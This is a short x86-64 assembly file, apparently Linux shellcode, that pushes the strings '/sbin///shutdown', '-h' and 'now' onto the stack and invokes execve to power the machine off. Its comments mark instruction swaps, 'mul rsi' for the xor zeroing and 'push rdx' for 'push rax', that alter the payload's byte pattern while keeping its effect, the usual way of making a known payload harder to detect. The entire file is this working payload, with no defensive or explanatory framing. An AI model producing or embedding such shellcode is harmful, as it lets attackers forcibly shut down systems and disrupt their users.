section .text

global _start

_start:

;xor rax, rax
;xor rdx, rdx 
mul rsi		;Point1 - zero out the rax and rdx
;push rax
push byte 0x77
push word 0x6f6e ; now
mov rbx, rsp

;push rax
push rdx	;Point2 - change the rax to rdx
push word 0x682d ;-h
mov rcx, rsp

;push rax
push rdx
mov r8, 0x2f2f2f6e6962732f ; ///nibs/
mov r10, 0x6e776f6474756873
push r10
push r8
mov rdi, rsp

push rdx
push rbx
push rcx
push rdi
mov rsi, rsp

add rax, 59
syscall
